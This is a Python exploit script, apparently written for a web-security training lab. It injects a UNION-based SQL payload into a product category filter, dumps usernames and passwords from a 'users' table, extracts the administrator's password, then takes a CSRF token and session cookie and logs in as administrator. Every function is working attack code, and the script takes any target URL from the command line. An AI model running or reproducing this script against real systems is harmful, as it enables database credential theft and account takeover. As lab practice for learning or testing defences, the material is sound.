import sys
import requests
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# routes through burp
# has to be the same as the proxy settings in burp
# Commented out and removed proxies=proxies from requests.get due to errors
# proxies = {'http':'http://127.0.1:8081', 'https': 'https://127.0.0.1:8081'}

def exploit_sqli_users_table(url):
    print("[?] Running 'exploit_sqli_users_table'")
    
    if url[len(url)-1] == "/":
        url=url[:-1]

    username = 'administrator'
    path = '/filter?category=Gifts'
    sql_payload = "' UNION SELECT NULL,username || '~' || password FROM users--"
    # Verify false to not verify tls certificates
    r = requests.get(url + path + sql_payload, verify=False)

    if "administrator" in r.text:
        print("[+] Found the administrator password...")
        
        soup = BeautifulSoup(r.text, 'html.parser')
        admin_password = soup.find(text=re.compile('.*administrator.*')).split("~")[1]

        print("[+] The Administrator password is '%s'." % admin_password)
        return admin_password
    return False

def get_session_data(url):
    if url[len(url)-1] == "/":
        url=url[:-1]

    path = '/login'

    print("[?] getting the CSRF token")
    r = requests.get(url + path, verify=False)

    if "csrf" in r.text:
        print("[+] CSRF token found")

        soup = BeautifulSoup(r.text, 'html.parser')
        csrfToken = soup.find('input',attrs = {'name':'csrf'})['value']

        d = dict();
        d["csrf"]=csrfToken;
        d["session"]=r.cookies["session"];

    else:
        print("[-] no CSRF token found")
        d=False
    
    return d
    

def login_as_admin(url, pwd):
    if url[len(url)-1] == "/":
        url=url[:-1]

    path = '/login'

    s=get_session_data(url)
    
    if s:
        body = {'csrf':s["csrf"], 
            'username': 'administrator', 
            'password':pwd}

        cookies= {'session':s["session"]}

        r = requests.post(url + path, data=body, cookies=cookies, verify=False)

        print("[+] Login status code '%s'" % r.status_code)

        if r.status_code == 200:
            results = True
        else:
            print("[-] something went wrong")
            print("[-] r.text")
            results = False
    else:
        results = False

    return results


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage : %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    print("[+] Dumping the list of usernames and passwords...")

    pwd=exploit_sqli_users_table(url)
    
    if pwd:
        login_as_admin(url, pwd)
    else:
        print("[-] Did not find an administrator password.")